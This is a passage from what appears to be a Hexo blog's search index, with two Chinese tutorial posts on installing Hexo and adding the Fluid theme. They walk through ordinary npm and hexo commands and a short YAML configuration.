    <url>/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9702%EF%BC%9A%E5%BC%95%E5%85%A5Fluid/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo从0到1搭建博客系列02：引入Fluid"><a href="#Hexo从0到1搭建博客系列02：引入Fluid" class="headerlink" title="Hexo从0到1搭建博客系列02：引入Fluid"></a>Hexo从0到1搭建博客系列02：引入Fluid</h1><h2 id="1-Fluid简介"><a href="#1-Fluid简介" class="headerlink" title="1. Fluid简介"></a>1. Fluid简介</h2><blockquote><p>Fluid [官网](<a href="https://hexo.fluid-dev.com/docs/start/">开始使用 | Hexo Fluid 用户手册</a>)</p><p>Fluid 是基于 Hexo 的一款 Material Design 风格的主题，由 Fluid-dev 负责开发与维护。</p><p>主题 GitHub: <a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>预览网站：<a href="https://hexo.fluid-dev.com/">Fluid’s blog</a> <a href="https://zkqiang.cn/">zkqiang’s blog</a></p></blockquote><p>Fluid其实就是基于Hexo现有功能，进行了更进一步的配置、美化，引入了很多新的功能，使我们的博客变得更加美观、简洁与高效。</p><p>在进行Fluid实战之前，必须得先搭建好Hexo基础博客。</p><h2 id="2-Fluid简单实战"><a href="#2-Fluid简单实战" class="headerlink" title="2. Fluid简单实战"></a>2. Fluid简单实战</h2><ol><li>进入之前搭建好的 <code>Hexo</code> 博客目录，执行以下命令，安装 <code>fluid</code> 主题</li></ol>  <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>  <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/fluid-install.png"></p><ol start="2"><li>在博客目录下创建 <code>_config.fluid.yml</code>，将 <code>fluid</code> 主题自己的 <code>_config.yml</code> 粘贴进去。</li></ol><p>  这一步很重要，一定要进入<a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml%E8%BF%99%E4%B8%80%E7%BD%91%E9%A1%B5%EF%BC%8C">https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml这一网页，</a> 将对应的文件粘贴到之前创建好的空的<code>_config.fluid.yml</code>文件中。这个文件很长，所以没办法贴在这里，见谅~</p><ol start="3"><li>打开创建好的 <code>Hexo</code> 博客目录下的 <code>_config.yml</code> ，将对应配置项修改为以下内容</li></ol><p>  一定要注意这是 <code>yaml</code> 格式文件，冒号后一定要有空格。</p><p>  灵活使用 <code>Ctrl + F</code> 搜索关键字</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">theme:</span> <span class="hljs-string">fluid</span>  <span class="hljs-comment"># 指定主题</span><br><br><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span>  <span class="hljs-comment"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p>仍然是使用 <code>hexo server</code> 命令运行到本地</p><p>展示一下成品吧~</p><p><img src="file:///Users/lty/Downloads/hexo-fluid-page.png?msec=1664956366776"></p><p>是不是瞬间比之前Hexo基础博客提升了一个档次？</p><p>之后我们的大部分功能将在 <code>_config.fluid.yml</code> 文件里完成配置~</p><h2 id="3-后记"><a href="#3-后记" class="headerlink" title="3. 后记"></a>3. 后记</h2><p>如果大家觉得我的内容写的还不错，可以在评论区留言支持一下呀~</p><p>欢迎大家来逛一逛我的<a href="https://ltyzzzxxx.github.io/">个人博客</a>~</p><p>此外，从2022.10.1开始，为激励自己持续刷题，我开始持续日更Leetcode题解啦~</p><p>所有题解均已放到<a href="https://github.com/ltyzzzxxx/Leetcode-Everyday">Github仓库</a>中，欢迎大家Star并提出Issue~</p>]]></content>
    
    
    <categories>
      
      <category>Hexo搭建博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo从0到1搭建博客系列01：浅尝Hexo.md</title>
    <link href="/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9701%EF%BC%9A%E6%B5%85%E5%B0%9DHexo-md/"/>
    <url>/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9701%EF%BC%9A%E6%B5%85%E5%B0%9DHexo-md/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo从0到1搭建博客系列01：浅尝Hexo"><a href="#Hexo从0到1搭建博客系列01：浅尝Hexo" class="headerlink" title="Hexo从0到1搭建博客系列01：浅尝Hexo"></a>Hexo从0到1搭建博客系列01：浅尝Hexo</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>作为一个程序员，我们总是想记录一些自己日常学习的东西、自己对于技术的思考以及自己平时折腾的一些小项目。但是自己手动搭建一个博客是很费时费力的一件事情，我们需要考虑一下几点难题：</p><ol><li><p>制作一个博客网站需要这些技术：后端采用 <code>SpringBoot</code> 全家桶，前端采用 <code>Vue/React</code> 。如果追求快速搭建一个博客，可以使用全栈 <code>nodejs</code>（ <code>egg.js</code>、<code>express</code>、<code>koa</code> 等）。如果想让博客功能更强大，需要引入更多的技术。但这些技术的学习都很耗时费力，极可能劝退。</p></li><li><p>如果想让博客页面更好看，需要自己设计 <code>UI</code>。</p></li><li><p>博客最终展示给别人，需要部署到服务器上才能让大家看到。需要买服务器、买域名、域名备案、学习部署知识等等。</p></li><li><p>服务器后期需要维护，一年维护费用可能几百至上千不等。</p></li><li><p>服务器被人恶意攻击（ <code>DDOS</code>、 <code>SQL注入</code> 等），需要自己手动解决或花钱升级服务器。</p></li></ol><p>如果你想要通过博客项目，以此学习前后端的知识、提升自己的编程水平甚至是将其作为一个简历上可以拿得出手的项目，我强烈建议你将以上步骤逐一完成，甚至可以将个人博客延伸为社交博客论坛（类似 <code>CSDN</code>、<code>掘金</code> 等），引入微服务与分布式技术。将这些做完，绝对会有明显的技术提升。</p><p>但是，如果你只想有一个自己的网站去记录一些日常的学习等内容，继续往下看，我将会使用 <code>Hexo</code> 简化以上流程，从0到1实现一个美观精致高效的博客。</p><h2 id="2-Hexo简介"><a href="#2-Hexo简介" class="headerlink" title="2. Hexo简介"></a>2. Hexo简介</h2><p>首先简单介绍一下 <code>Hexo</code></p><blockquote><p>引自[官方](<a href="https://hexo.io/zh-cn/docs/index.html">文档 | Hexo</a>)</p><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></blockquote><p>其实 <code>Hexo</code> 就是帮我们完成了大部分与书写博客无关的事情，我们只需要根据 <code>Hexo</code> 现有的框架，做一些简单的配置，即可做出一个博客网站。之后，我们就可以专注地写自己的博客啦</p><p>在接下来的部分中，你只需要有以下几点前置知识，即可快速完成之后系列的全部内容：</p><ol><li><code>Node.js</code>：主要用于安装<code>Hexo</code>、发布文章、部署等操作</li></ol><p>  安装 <code>Node.js</code> ：</p><ol><li><p><a href="https://nodejs.org/en/download/">官网</a>安装</p></li><li><p>Mac可采用 <code>Homebrew</code> 安装</p></li><li><p><code>Git</code> 及 <code>Github</code>：最后的博客网站将发布到 <code>Github</code> 中</p></li><li><p><code>Markdown</code>：这个很简单，在 <code>CSDN</code> 或者用Typora写过博客的人都知道怎么用</p></li></ol><p>之后全部的实战部分，均采用 <code>VSCode</code> 编辑器完成。如果你熟练使用命令行操作，也可以直接在命令行上完成全部操作。</p><h2 id="3-Hexo简单实战"><a href="#3-Hexo简单实战" class="headerlink" title="3. Hexo简单实战"></a>3. Hexo简单实战</h2><ol><li>首先打开命令行窗口，执行以下命令，安装Hexo。</li></ol>  <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">$ npm install -g hexo-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p>  <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/hexo-install.png"></p><ol start="2"><li>选择一个合适的位置（之后博客全部文件所在的地方），执行以下命令。</li></ol><p>  这里我博客命名为ltyzzz-blog</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> hexo init ltyzzz<span class="hljs-literal">-blog</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> ltyzzz<span class="hljs-literal">-blog</span><br><span class="hljs-variable">$</span> npm install<br></code></pre></td></tr></table></figure><ol start="3"><li>通过 <code>VSCode</code> 打开创建好的博客目录</li></ol><p>  <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/hexo-file.png" alt="https//cdnjsdelivrnet/gh/ltyzzzxxx/ltyzzzImageBed/blogimg/hexofilepng"></p><p>  介绍其中几个重要的文件：</p><ul><li><p>_config.yml：博客相关的配置均在这个文件中（之后引入Fluid主题后有所变化）</p></li><li><p>source：用来存放用户资源的位置（我们写的文章就存储在这里）</p></li></ul><ol start="4"><li>执行以下命令，生成静态网页文件 <code>public</code></li></ol>  <figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">$ hexo <span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure><ol start="5"><li>执行以下命令，在本地服务器（默认为：<code>http://localhost:4000/</code>）启动博客</li></ol>  <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">$ hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>最终Hexo基础博客页面如图所示：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/hexo-page.png"></p><p>看到这里，是不是感觉Hexo页面十分的简陋甚至有点丑？</p><p>没关系，之前的部分只是带大家简单尝试一下Hexo，了解一下基本的框架与命令使用。</p><p>我们的重头戏将放在Fluid主题，通过该主题熟悉Hexo核心功能以及Fluid新增的功能。</p><p>接下来的内容包括有：</p><ol><li>博客文章的编辑与发布</li><li>评论区功能模块引入</li><li>图床的最佳实践</li><li>新增留言板界面</li><li>将博客部署到Github</li></ol><h2 id="4-后记"><a href="#4-后记" class="headerlink" title="4. 后记"></a>4. 后记</h2><p>如果大家觉得我的内容写的还不错，可以在评论区留言支持一下呀~</p><p>欢迎大家来逛一逛我的<a href="https://ltyzzzxxx.github.io/">个人博客</a>~</p><p>此外，从2022.10.1开始，为激励自己持续刷题，我开始持续日更Leetcode题解啦~</p><p>所有题解均已放到<a href="https://github.com/ltyzzzxxx/Leetcode-Everyday">Github仓库</a>中，欢迎大家Star并提出Issue~</p>]]></content>
    
    
    <categories>
      
      <category>Hexo搭建博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
